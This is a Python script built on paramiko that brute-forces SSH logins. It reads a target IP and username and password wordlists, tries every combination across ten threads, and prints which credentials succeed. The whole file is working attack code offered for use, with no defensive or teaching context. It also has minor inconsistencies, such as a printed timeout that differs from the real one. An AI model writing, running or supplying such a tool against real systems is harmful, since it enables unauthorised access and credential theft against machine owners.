import paramiko
from concurrent.futures import ThreadPoolExecutor

def ssh_login(ip, usr, pwd):
    try:
        print(f"Attempting login: User='{usr}', Pass='{pwd}', timeout=10")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=usr, password=pwd, timeout=5)
        print(f"Login successful: User='{usr}', Pass='{pwd}'")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"Login failed: User='{usr}', Pass='{pwd}' (Authentication failed)")
    except paramiko.SSHException as e:
        print(f"Login failed: User='{usr}', Pass='{pwd}' (SSH error: {e})")
    except paramiko.BadHostKeyException as e:
        print(f"Login failed: User='{usr}', Pass='{pwd}' (Host key error: {e})")
    except paramiko.ChannelException as e:
        print(f"Login failed: User='{usr}', Pass='{pwd}' (Channel error: {e})")
    except paramiko.PartialAuthentication as e:
        print(f"Login failed: User='{usr}', Pass='{pwd}' (Partial authentication: {e})")
    except Exception as e:
        print(f"Error occurred: {e}")
    return False

def main():
    ip = input("Enter the target IP address: ")
    usr_file = input("Enter the username file path: ")
    pwd_file = input("Enter the password file path: ")

    with open(usr_file, 'r', encoding='utf-8') as usr_file:
        with open(pwd_file, 'r', encoding='latin-1') as pwd_file:
            usr_list = [usr.strip() for usr in usr_file]
            pwd_list = [pwd.strip() for pwd in pwd_file]

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(ssh_login, ip, usr, pwd) for usr in usr_list for pwd in pwd_list]

        for future in futures:
            future.result()

if __name__ == "__main__":
    main()
